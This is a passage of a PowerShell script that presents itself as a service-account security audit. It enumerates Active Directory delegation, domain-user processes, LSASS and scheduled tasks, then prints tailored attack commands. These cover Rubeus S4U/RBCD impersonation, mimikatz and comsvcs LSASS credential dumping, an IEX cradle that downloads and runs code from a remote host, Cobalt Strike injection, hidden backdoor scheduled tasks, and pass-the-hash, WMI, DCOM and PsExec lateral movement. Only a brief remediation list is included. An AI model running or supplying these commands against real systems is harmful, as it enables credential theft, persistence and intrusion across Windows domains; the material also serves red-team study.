                    Write-Host "    Can Delegate To:" -ForegroundColor Gray
                    foreach ($target in $delegateTo) {
                        Write-Host "      - $target" -ForegroundColor Yellow
                    }
                    
                    # Check for Protocol Transition
                    $uac = [int64]$comp.Properties['useraccountcontrol'][0]
                    if ($uac -band 16777216) {
                        Write-Host "    [!] PROTOCOL TRANSITION ENABLED - Can impersonate any user!" -ForegroundColor Red
                    }
                }
                
                Write-Host "`n  [CONSTRAINED DELEGATION EXPLOITATION]:" -ForegroundColor Red
                Write-Host "`n  # S4U2Self + S4U2Proxy Attack (Rubeus)" -ForegroundColor White
                Write-Host "  Rubeus.exe s4u /user:[SERVICE_ACCOUNT] /rc4:[NTLM_HASH] /impersonateuser:Administrator /msdsspn:[TARGET_SPN] /ptt" -ForegroundColor Yellow
                Write-Host "  # Example:" -ForegroundColor Gray
                Write-Host "  Rubeus.exe s4u /user:websvc /aes256:[KEY] /impersonateuser:Administrator /msdsspn:cifs/dc.domain.com /ptt" -ForegroundColor Yellow
            } else {
                Write-Host "  No constrained delegation found" -ForegroundColor Green
            }
        } catch {
            Write-Host "  Error enumerating constrained delegation: $_" -ForegroundColor Red
        }
        
        # Resource-Based Constrained Delegation
        Write-Host "`n[+] Resource-Based Constrained Delegation (RBCD):" -ForegroundColor Cyan
        Write-Host "  [RBCD ATTACK METHODOLOGY]:" -ForegroundColor Red
        
        Write-Host "`n  # Step 1: Create/Control Computer Account" -ForegroundColor White
        Write-Host "  # Using PowerMad" -ForegroundColor Gray
        Write-Host "  Import-Module Powermad" -ForegroundColor Yellow
        Write-Host "  New-MachineAccount -MachineAccount FAKE01 -Password `$(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)" -ForegroundColor Yellow
        
        Write-Host "`n  # Step 2: Configure RBCD on Target" -ForegroundColor White
        Write-Host "  # Using PowerView" -ForegroundColor Gray
        Write-Host "  `$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid" -ForegroundColor Yellow
        Write-Host "  `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList `"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;`$(`$ComputerSid))`"" -ForegroundColor Yellow
        Write-Host "  `$SDBytes = New-Object byte[] (`$SD.BinaryLength)" -ForegroundColor Yellow
        Write-Host "  `$SD.GetBinaryForm(`$SDBytes, 0)" -ForegroundColor Yellow
        Write-Host "  Get-DomainComputer [TARGET] | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=`$SDBytes}" -ForegroundColor Yellow
        
        Write-Host "`n  # Step 3: Perform S4U Attack" -ForegroundColor White
        Write-Host "  Rubeus.exe s4u /user:FAKE01`$ /rc4:[NTLM_HASH] /impersonateuser:Administrator /msdsspn:cifs/[TARGET] /ptt" -ForegroundColor Yellow
        Write-Host "  # Access target:" -ForegroundColor Gray
        Write-Host "  dir \\[TARGET]\C`$" -ForegroundColor Yellow
        
    } else {
        Write-Host "`n[!] Not domain-joined - AD enumeration skipped" -ForegroundColor Yellow
    }
    
    # ========================================================================
    # SECTION 5: PROCESS MEMORY & TOKEN ANALYSIS
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [5] PROCESS MEMORY & TOKEN ANALYSIS                                        ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Processes Running as Domain Users:" -ForegroundColor Cyan
    
    try {
        $processes = Get-CimInstance Win32_Process | ForEach-Object {
            try {
                $owner = Invoke-CimMethod -InputObject $_ -MethodName GetOwner -ErrorAction Stop
                if ($owner.Domain -and $owner.Domain -ne $env:COMPUTERNAME -and 
                    $owner.User -notmatch '^(SYSTEM|LOCAL SERVICE|NETWORK SERVICE|DWM-\d+|UMFD-\d+)$') {
                    [PSCustomObject]@{
                        ProcessName = $_.Name
                        PID = $_.ProcessId
                        Domain = $owner.Domain
                        User = $owner.User
                        CommandLine = $_.CommandLine
                        ParentPID = $_.ParentProcessId
                    }
                }
            } catch {}
        }
        
        if ($processes) {
            $groupedProcesses = $processes | Group-Object Domain,User
            Write-Host "  Found $($processes.Count) domain user processes across $($groupedProcesses.Count) accounts" -ForegroundColor Yellow
            
            foreach ($group in $groupedProcesses) {
                $account = $group.Name
                Write-Host "`n  [Account: $account]" -ForegroundColor Yellow
                Write-Host "    Process Count: $($group.Count)" -ForegroundColor Gray
                
                $topProcs = $group.Group | Select-Object -First 5
                foreach ($proc in $topProcs) {
                    Write-Host "    - $($proc.ProcessName) (PID: $($proc.PID))" -ForegroundColor White
                    if ($proc.CommandLine) {
                        $cmdShort = if ($proc.CommandLine.Length -gt 80) { 
                            $proc.CommandLine.Substring(0,77) + "..." 
                        } else { 
                            $proc.CommandLine 
                        }
                        Write-Host "      CMD: $cmdShort" -ForegroundColor Gray
                    }
                }
                
                if ($group.Count -gt 5) {
                    Write-Host "    ... and $($group.Count - 5) more processes" -ForegroundColor Gray
                }
            }
            
            Write-Host "`n  [PROCESS & TOKEN EXPLOITATION]:" -ForegroundColor Red
            
            Write-Host "`n  # Enumerate All Tokens" -ForegroundColor White
            Write-Host "  # Incognito" -ForegroundColor Gray
            Write-Host "  incognito.exe list_tokens -u" -ForegroundColor Yellow
            
            Write-Host "  # Invoke-TokenManipulation" -ForegroundColor Gray
            Write-Host "  IEX (New-Object Net.WebClient).DownloadString('http://[IP]/Invoke-TokenManipulation.ps1')" -ForegroundColor Yellow
            Write-Host "  Invoke-TokenManipulation -ShowAll" -ForegroundColor Yellow
            Write-Host "  Invoke-TokenManipulation -Enumerate" -ForegroundColor Yellow
            
            Write-Host "`n  # Token Impersonation" -ForegroundColor White
            $firstProc = $processes[0]
            Write-Host "  Invoke-TokenManipulation -ImpersonateUser -Username `"$($firstProc.Domain)\$($firstProc.User)`"" -ForegroundColor Yellow
            Write-Host "  Invoke-TokenManipulation -CreateProcess `"cmd.exe`" -ProcessId $($firstProc.PID)" -ForegroundColor Yellow
            
            Write-Host "`n  # Memory Dump for Credentials" -ForegroundColor White
            foreach ($proc in $processes | Select-Object -First 3) {
                Write-Host "  procdump.exe -accepteula -ma $($proc.PID) $($proc.ProcessName)_$($proc.PID).dmp" -ForegroundColor Yellow
            }
            Write-Host "  # Then analyze with Mimikatz:" -ForegroundColor Gray
            Write-Host "  mimikatz.exe `"sekurlsa::minidump process.dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
            
            Write-Host "`n  # Process Injection" -ForegroundColor White
            Write-Host "  # Inject into target process to inherit token" -ForegroundColor Gray
            Write-Host "  # Using Metasploit:" -ForegroundColor Gray
            Write-Host "  migrate $($firstProc.PID)" -ForegroundColor Yellow
            Write-Host "  # Using Cobalt Strike:" -ForegroundColor Gray
            Write-Host "  inject $($firstProc.PID) x64 payload.bin" -ForegroundColor Yellow
            
            Add-ExploitCommand "Token Enumeration" "Invoke-TokenManipulation -ShowAll"
        } else {
            Write-Host "  No domain user processes found" -ForegroundColor Gray
        }
    } catch {
        Write-Host "  Error analyzing processes: $_" -ForegroundColor Red
    }
    
    # LSASS Analysis
    Write-Host "`n[+] LSASS Process Analysis:" -ForegroundColor Cyan
    try {
        $lsass = Get-Process lsass -ErrorAction Stop
        Write-Host "  PID: $($lsass.Id)" -ForegroundColor White
        Write-Host "  Handles: $($lsass.HandleCount)" -ForegroundColor Yellow
        Write-Host "  Threads: $($lsass.Threads.Count)" -ForegroundColor Gray
        Write-Host "  Memory: $([math]::Round($lsass.WorkingSet64/1MB,2)) MB" -ForegroundColor Gray
        Write-Host "  Start Time: $($lsass.StartTime)" -ForegroundColor Gray
        
        if ($lsass.HandleCount -gt 1500) {
            Write-Host "  [!] WARNING: Unusual handle count detected!" -ForegroundColor Red
            Add-Finding "MEDIUM" "LSASS Anomaly" "High handle count: $($lsass.HandleCount)"
        }
        
        Write-Host "`n  [LSASS CREDENTIAL EXTRACTION]:" -ForegroundColor Red
        
        Write-Host "`n  # Method 1: Direct Mimikatz" -ForegroundColor White
        Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::logonpasswords full`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::wdigest`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::kerberos`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::msv`" `"exit`"" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 2: Memory Dump + Offline Analysis" -ForegroundColor White
        Write-Host "  # Create dump:" -ForegroundColor Gray
        Write-Host "  procdump.exe -accepteula -ma $($lsass.Id) lsass.dmp" -ForegroundColor Yellow
        Write-Host "  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) C:\temp\lsass.dmp full" -ForegroundColor Yellow
        Write-Host "  # Analyze offline:" -ForegroundColor Gray
        Write-Host "  mimikatz.exe `"sekurlsa::minidump lsass.dmp`" `"sekurlsa::logonpasswords`" `"exit`"" -ForegroundColor Yellow
        Write-Host "  pypykatz lsa minidump lsass.dmp" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 3: Remote LSASS Dump" -ForegroundColor White
        Write-Host "  crackmapexec smb [TARGET] -u [USER] -p [PASS] --lsa" -ForegroundColor Yellow
        Write-Host "  crackmapexec smb [TARGET] -u [USER] -H [NTLM] --lsa" -ForegroundColor Yellow
        
        Write-Host "`n  # Method 4: Task Manager Method (GUI)" -ForegroundColor White
        Write-Host "  # 1. Open Task Manager as Admin" -ForegroundColor Gray
        Write-Host "  # 2. Find 'Local Security Authority Process'" -ForegroundColor Gray
        Write-Host "  # 3. Right-click -> Create dump file" -ForegroundColor Gray
        Write-Host "  # 4. Analyze: mimikatz.exe `"sekurlsa::minidump lsass.DMP`" `"sekurlsa::logonpasswords`"" -ForegroundColor Gray
        
        Write-Host "`n  # Method 5: Living Off The Land (LOTL)" -ForegroundColor White
        Write-Host "  # Using comsvcs.dll:" -ForegroundColor Gray
        Write-Host "  powershell -c `"rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) C:\temp\lsass.dmp full`"" -ForegroundColor Yellow
        
        Add-ExploitCommand "LSASS Dump" "procdump.exe -accepteula -ma $($lsass.Id) lsass.dmp"
        
    } catch {
        Write-Host "  Could not access LSASS process" -ForegroundColor Red
    }
    
    # ========================================================================
    # SECTION 6: SCHEDULED TASKS & PERSISTENCE
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [6] SCHEDULED TASKS & PERSISTENCE MECHANISMS                               ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[+] Scheduled Tasks with Domain Accounts:" -ForegroundColor Cyan
    try {
        $taskOutput = schtasks /query /fo csv /v 2>$null
        if ($taskOutput) {
            $tasks = $taskOutput | ConvertFrom-Csv
            $domainTasks = $tasks | Where-Object { 
                $_.'Run As User' -match '^[A-Za-z0-9_-]+\\.+' 
            }
            
            if ($domainTasks) {
                Write-Host "  [!] DOMAIN ACCOUNT TASKS FOUND: $($domainTasks.Count)" -ForegroundColor Red
                
                foreach ($task in $domainTasks | Select-Object -First 10) {
                    Write-Host "`n  [Task: $($task.TaskName)]" -ForegroundColor Yellow
                    Write-Host "    User: $($task.'Run As User')" -ForegroundColor Red
                    Write-Host "    Status: $($task.Status)" -ForegroundColor Gray
                    Write-Host "    Next Run: $($task.'Next Run Time')" -ForegroundColor Gray
                    Write-Host "    Schedule: $($task.'Schedule Type')" -ForegroundColor Gray
                    
                    if ($task.'Task To Run') {
                        $taskCmd = if ($task.'Task To Run'.Length -gt 80) {
                            $task.'Task To Run'.Substring(0,77) + "..."
                        } else {
                            $task.'Task To Run'
                        }
                        Write-Host "    Command: $taskCmd" -ForegroundColor Gray
                    }
                    
                    Add-Finding "MEDIUM" "Domain Task" "$($task.TaskName) runs as $($task.'Run As User')"
                }
                
                if ($domainTasks.Count -gt 10) {
                    Write-Host "`n  ... and $($domainTasks.Count - 10) more tasks" -ForegroundColor Gray
                }
                
                Write-Host "`n  [SCHEDULED TASK EXPLOITATION]:" -ForegroundColor Red
                
                Write-Host "`n  # Enumerate Task Details" -ForegroundColor White
                foreach ($task in $domainTasks | Select-Object -First 3) {
                    Write-Host "  schtasks /query /tn `"$($task.TaskName)`" /v /fo list" -ForegroundColor Yellow
                }
                
                Write-Host "`n  # Modify Task (if writable)" -ForegroundColor White
                Write-Host "  schtasks /change /tn `"[TASK_NAME]`" /tr `"C:\temp\evil.exe`"" -ForegroundColor Yellow
                Write-Host "  schtasks /change /tn `"[TASK_NAME]`" /ru SYSTEM" -ForegroundColor Yellow
                
                Write-Host "`n  # Create Backdoor Task" -ForegroundColor White
                Write-Host "  schtasks /create /sc minute /mo 5 /tn `"SystemUpdate`" /tr `"powershell -w hidden -enc [BASE64]`" /ru SYSTEM" -ForegroundColor Yellow
                Write-Host "  schtasks /create /sc onlogon /tn `"UserInit`" /tr `"C:\temp\backdoor.exe`" /ru `"[DOMAIN]\[USER]`" /rp [PASSWORD]" -ForegroundColor Yellow
                
                Write-Host "`n  # Extract Credentials from Tasks (if possible)" -ForegroundColor White
                Write-Host "  # Tasks created with /rp store credentials in LSA Secrets:" -ForegroundColor Gray
                Write-Host "  mimikatz.exe `"privilege::debug`" `"token::elevate`" `"lsadump::secrets`" `"exit`"" -ForegroundColor Yellow
                
                Add-ExploitCommand "Task Enumeration" "schtasks /query /v /fo list"
            } else {
                Write-Host "  No scheduled tasks with domain accounts found" -ForegroundColor Green
            }
        }
    } catch {
        Write-Host "  Error enumerating scheduled tasks: $_" -ForegroundColor Red
    }
    
    # ========================================================================
    # SECTION 7: LATERAL MOVEMENT OPPORTUNITIES
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [7] LATERAL MOVEMENT ATTACK VECTORS                                        ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    Write-Host "`n[LATERAL MOVEMENT TECHNIQUES]:" -ForegroundColor Red
    
    Write-Host "`n[+] Pass-the-Hash (PTH):" -ForegroundColor Cyan
    Write-Host "  # Using Mimikatz" -ForegroundColor White
    Write-Host "  mimikatz.exe `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:cmd.exe`"" -ForegroundColor Yellow
    Write-Host "  mimikatz.exe `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:powershell.exe`"" -ForegroundColor Yellow
    
    Write-Host "`n  # Using Impacket" -ForegroundColor White
    Write-Host "  impacket-psexec [DOMAIN]/[USER]@[TARGET] -hashes :[NTLM]" -ForegroundColor Yellow
    Write-Host "  impacket-wmiexec [DOMAIN]/[USER]@[TARGET] -hashes :[NTLM]" -ForegroundColor Yellow
    Write-Host "  impacket-smbexec [DOMAIN]/[USER]@[TARGET] -hashes :[NTLM]" -ForegroundColor Yellow
    Write-Host "  impacket-atexec [DOMAIN]/[USER]@[TARGET] -hashes :[NTLM] 'whoami'" -ForegroundColor Yellow
    
    Write-Host "`n  # Using CrackMapExec" -ForegroundColor White
    Write-Host "  crackmapexec smb [TARGET] -u [USER] -H [NTLM] -x 'whoami'" -ForegroundColor Yellow
    Write-Host "  crackmapexec smb [TARGET_FILE] -u [USER] -H [NTLM] --exec-method wmiexec" -ForegroundColor Yellow
    Write-Host "  crackmapexec smb [TARGET] -u [USER] -H [NTLM] -M mimikatz" -ForegroundColor Yellow
    
    Write-Host "`n[+] Pass-the-Ticket (PTT):" -ForegroundColor Cyan
    Write-Host "  # Export and inject tickets" -ForegroundColor White
    Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::tickets /export`" `"exit`"" -ForegroundColor Yellow
    Write-Host "  mimikatz.exe `"kerberos::ptt [ticket.kirbi]`" `"exit`"" -ForegroundColor Yellow
    Write-Host "  # Verify access:" -ForegroundColor Gray
    Write-Host "  dir \\[TARGET]\C`$" -ForegroundColor Yellow
    Write-Host "  Enter-PSSession -ComputerName [TARGET]" -ForegroundColor Yellow
    
    Write-Host "`n[+] Over-Pass-the-Hash:" -ForegroundColor Cyan
    Write-Host "  # Request TGT with NTLM hash" -ForegroundColor White
    Write-Host "  Rubeus.exe asktgt /user:[USER] /domain:[DOMAIN] /rc4:[NTLM] /ptt" -ForegroundColor Yellow
    Write-Host "  Rubeus.exe asktgt /user:[USER] /domain:[DOMAIN] /aes256:[AES_KEY] /opsec /ptt" -ForegroundColor Yellow
    
    Write-Host "`n[+] WMI Lateral Movement:" -ForegroundColor Cyan
    Write-Host "  # PowerShell WMI" -ForegroundColor White
    Write-Host "  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c [COMMAND]' -ComputerName [TARGET]" -ForegroundColor Yellow
    Write-Host "  `$cred = Get-Credential" -ForegroundColor Yellow
    Write-Host "  Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell.exe' -ComputerName [TARGET] -Credential `$cred" -ForegroundColor Yellow
    
    Write-Host "  # WMIC" -ForegroundColor White
    Write-Host "  wmic /node:[TARGET] /user:[DOMAIN]\[USER] /password:[PASS] process call create `"cmd.exe /c [COMMAND]`"" -ForegroundColor Yellow
    
    Write-Host "`n[+] PSExec / SMB:" -ForegroundColor Cyan
    Write-Host "  # Sysinternals PSExec" -ForegroundColor White
    Write-Host "  psexec.exe \\[TARGET] -u [DOMAIN]\[USER] -p [PASS] cmd.exe" -ForegroundColor Yellow
    Write-Host "  psexec.exe \\[TARGET] -u [DOMAIN]\[USER] -p [PASS] -s cmd.exe  # Run as SYSTEM" -ForegroundColor Yellow
    
    Write-Host "  # Impacket PSExec" -ForegroundColor White
    Write-Host "  impacket-psexec [DOMAIN]/[USER]:[PASS]@[TARGET]" -ForegroundColor Yellow
    
    Write-Host "`n[+] WinRM / PowerShell Remoting:" -ForegroundColor Cyan
    Write-Host "  # Enter-PSSession" -ForegroundColor White
    Write-Host "  `$cred = Get-Credential" -ForegroundColor Yellow
    Write-Host "  Enter-PSSession -ComputerName [TARGET] -Credential `$cred" -ForegroundColor Yellow
    
    Write-Host "  # Invoke-Command" -ForegroundColor White
    Write-Host "  Invoke-Command -ComputerName [TARGET] -ScriptBlock { whoami } -Credential `$cred" -ForegroundColor Yellow
    Write-Host "  Invoke-Command -ComputerName [TARGET] -FilePath C:\temp\script.ps1 -Credential `$cred" -ForegroundColor Yellow
    
    Write-Host "  # Using evil-winrm" -ForegroundColor White
    Write-Host "  evil-winrm -i [TARGET] -u [USER] -p [PASS]" -ForegroundColor Yellow
    Write-Host "  evil-winrm -i [TARGET] -u [USER] -H [NTLM]" -ForegroundColor Yellow
    
    Write-Host "`n[+] DCOM Lateral Movement:" -ForegroundColor Cyan
    Write-Host "  # MMC20.Application" -ForegroundColor White
    Write-Host "  `$com = [Activator]::CreateInstance([type]::GetTypeFromProgID(`"MMC20.Application`", `"[TARGET]`"))" -ForegroundColor Yellow
    Write-Host "  `$com.Document.ActiveView.ExecuteShellCommand('cmd.exe', `$null, '/c [COMMAND]', '7')" -ForegroundColor Yellow
    
    Write-Host "  # ShellWindows / ShellBrowserWindow" -ForegroundColor White
    Write-Host "  `$com = [Activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', '[TARGET]'))" -ForegroundColor Yellow
    Write-Host "  `$com.item().Document.Application.ShellExecute('cmd.exe', '/c [COMMAND]', '', '', 0)" -ForegroundColor Yellow
    
    Write-Host "`n[+] RDP with Restricted Admin:" -ForegroundColor Cyan
    Write-Host "  # Enable Restricted Admin on target:" -ForegroundColor White
    Write-Host "  reg add `"HKLM\System\CurrentControlSet\Control\Lsa`" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f" -ForegroundColor Yellow
    Write-Host "  # Connect using PTH:" -ForegroundColor White
    Write-Host "  mimikatz.exe `"privilege::debug`" `"sekurlsa::pth /user:[USER] /domain:[DOMAIN] /ntlm:[HASH] /run:mstsc.exe`"" -ForegroundColor Yellow
    Write-Host "  # In RDP window, connect with /restrictedadmin flag" -ForegroundColor Gray
    
    # ========================================================================
    # SECTION 8: RISK ASSESSMENT & SUMMARY
    # ========================================================================
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "║ [8] RISK ASSESSMENT & SUMMARY                                              ║" -ForegroundColor Green
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green
    
    # Calculate risk score
    $riskScore = 0
    $criticalFindings = $script:Findings | Where-Object { $_.Severity -eq "CRITICAL" }
    $highFindings = $script:Findings | Where-Object { $_.Severity -eq "HIGH" }
    $mediumFindings = $script:Findings | Where-Object { $_.Severity -eq "MEDIUM" }
    
    $riskScore += $criticalFindings.Count * 10
    $riskScore += $highFindings.Count * 5
    $riskScore += $mediumFindings.Count * 2
    
    Write-Host "`n[+] Risk Assessment:" -ForegroundColor Cyan
    Write-Host "  Total Risk Score: $riskScore" -ForegroundColor $(
        if($riskScore -gt 30){'Red'}
        elseif($riskScore -gt 15){'Yellow'}
        else{'Green'}
    )
    Write-Host "  Critical Findings: $($criticalFindings.Count)" -ForegroundColor $(if($criticalFindings.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  High Findings: $($highFindings.Count)" -ForegroundColor $(if($highFindings.Count -gt 0){'Red'}else{'Green'})
    Write-Host "  Medium Findings: $($mediumFindings.Count)" -ForegroundColor $(if($mediumFindings.Count -gt 0){'Yellow'}else{'Green'})
    
    if ($script:Findings.Count -gt 0) {
        Write-Host "`n[+] Finding Details:" -ForegroundColor Cyan
        foreach ($finding in $script:Findings) {
            $color = switch($finding.Severity) {
                "CRITICAL" { "Red" }
                "HIGH" { "Red" }
                "MEDIUM" { "Yellow" }
                default { "Gray" }
            }
            Write-Host "  [$($finding.Severity)] $($finding.Category): $($finding.Description)" -ForegroundColor $color
        }
    }
    
    # Recommendations
    Write-Host "`n[+] Security Recommendations:" -ForegroundColor Cyan
    if ($criticalFindings.Count -gt 0) {
        Write-Host "  [!] IMMEDIATE ACTION REQUIRED" -ForegroundColor Red
        Write-Host "    - Review and remediate all CRITICAL findings" -ForegroundColor Red
        Write-Host "    - Implement emergency password rotation for affected accounts" -ForegroundColor Red
    }
    if ($domainServiceAccounts.Count -gt 0) {
        Write-Host "  - Migrate $($domainServiceAccounts.Count) services to Managed Service Accounts (MSA/gMSA)" -ForegroundColor Yellow
    }
    if ($privileges['SeDebugPrivilege'] -eq 'ENABLED') {
        Write-Host "  - Remove SeDebugPrivilege from non-admin accounts" -ForegroundColor Yellow
    }
    Write-Host "  - Implement Credential Guard on Windows 10/11/Server 2016+" -ForegroundColor Gray
    Write-Host "  - Enable LSA Protection (RunAsPPL)" -ForegroundColor Gray
    Write-Host "  - Disable NTLM where possible, use Kerberos exclusively" -ForegroundColor Gray
    Write-Host "  - Implement proper network segmentation" -ForegroundColor Gray
    
    # Export results
    if ($ExportResults) {
        try {
            $reportContent = @"
SERVICE ACCOUNT SECURITY AUDIT REPORT
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
Computer: $env:COMPUTERNAME
Domain: $((Get-WmiObject Win32_ComputerSystem).Domain)
User: $env:USERDOMAIN\$env:USERNAME

RISK SCORE: $riskScore
Critical Findings: $($criticalFindings.Count)
High Findings: $($highFindings.Count)
Medium Findings: $($mediumFindings.Count)

FINDINGS:
$($script:Findings | ForEach-Object { "[$($_.Severity)] $($_.Category): $($_.Description)" } | Out-String)

EXPLOIT COMMANDS GENERATED: $($script:ExploitCommands.Count)

"@
            $reportContent | Out-File -FilePath $OutputPath -Encoding UTF8
            Write-Host "`n[+] Report exported to: $OutputPath" -ForegroundColor Green
        } catch {
            Write-Host "`n[!] Failed to export report: $_" -ForegroundColor Red
        }
    }
    
    # Final summary
    $endTime = Get-Date
    $duration = $endTime - $script:StartTime
    
    Write-Host "`n╔════════════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║ AUDIT COMPLETE                                                             ║" -ForegroundColor Cyan
    Write-Host "╚════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host "[+] End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Gray
    Write-Host "[+] Duration: $($duration.TotalSeconds) seconds" -ForegroundColor Gray
    Write-Host "[+] Exploit Commands Generated: $($script:ExploitCommands.Count)" -ForegroundColor Gray
    Write-Host "[+] Findings: $($script:Findings.Count)" -ForegroundColor Gray
    
    if ($riskScore -gt 30) {
        Write-Host "`n[!] CRITICAL RISK LEVEL - IMMEDIATE REMEDIATION REQUIRED" -ForegroundColor Red
    } elseif ($riskScore -gt 15) {
        Write-Host "`n[!] ELEVATED RISK LEVEL - REVIEW AND REMEDIATE" -ForegroundColor Yellow
    } else {
        Write-Host "`n[+] ACCEPTABLE RISK LEVEL - Continue monitoring" -ForegroundColor Green
    }
    
    Write-Host ""
}

# Helper Functions
function Add-Finding {
    param(
        [string]$Severity,
        [string]$Category,
        [string]$Description
    )
    $script:Findings += [PSCustomObject]@{
        Severity = $Severity
        Category = $Category
        Description = $Description
        Timestamp = Get-Date
    }
}

function Add-ExploitCommand {
    param(
        [string]$Category,
        [string]$Command
    )
    $script:ExploitCommands += [PSCustomObject]@{
        Category = $Category
        Command = $Command
    }
}

# ============================================================================
# EXECUTION
# ============================================================================

# Check if running with admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host @"
╔════════════════════════════════════════════════════════════════════════════╗
║                          PRIVILEGE NOTICE                                  ║
╚════════════════════════════════════════════════════════════════════════════╝
"@ -ForegroundColor Yellow
    Write-Host "[!] Not running with administrative privileges" -ForegroundColor Yellow
    Write-Host "[!] Many checks will be limited or unavailable" -ForegroundColor Yellow
    Write-Host "[!] For full audit capabilities, run as Administrator" -ForegroundColor Yellow
    Write-Host ""
    
    $continue = Read-Host "Continue with limited checks? (Y/N)"
    if ($continue -ne 'Y') {
        exit
    }
}

# Execute audit
Invoke-ComprehensiveServiceAudit -GenerateExploitCommands -DetailedOutput -ExportResults
